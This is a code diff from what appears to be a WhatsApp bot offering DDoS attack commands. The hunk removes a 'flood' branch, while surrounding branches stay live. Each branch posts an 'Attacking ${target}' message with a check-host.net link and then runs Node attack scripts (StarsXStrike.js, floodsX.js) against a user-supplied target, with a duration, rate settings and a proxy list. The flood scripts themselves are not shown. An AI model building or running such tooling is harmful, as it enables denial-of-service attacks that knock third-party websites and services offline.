@@ -159,18 +159,6 @@ thumbnailUrl: thumb,
 sourceUrl: `https://check-host.net/check-http?host=${target}`
 }}, text: details}, {quoted: m})
 	exec(`node ./lib/PermenMD/StarsXStrike.js GET ${target} ${duration} 10 100 proxy.txt`)
-} else if ( methods === 'flood' ) {     
-conn.sendMessage(m.chat, { contextInfo: {
-externalAdReply: {
-showAdAttribution: true, 
-title: `Attacking ${target}`,
-body: `Check-Host Click Me`,
-mediaType: 1,  
-renderLargerThumbnail : true,
-thumbnailUrl: thumb,
-sourceUrl: `https://check-host.net/check-http?host=${target}`
-}}, text: details}, {quoted: m})
-	exec(`node ./lib/PermenMD/floodsX.js ${target} ${duration} 10 100 proxy.txt`
 } else if ( methods === 'xc' ) {     
 conn.sendMessage(m.chat, { contextInfo: {
 externalAdReply: {
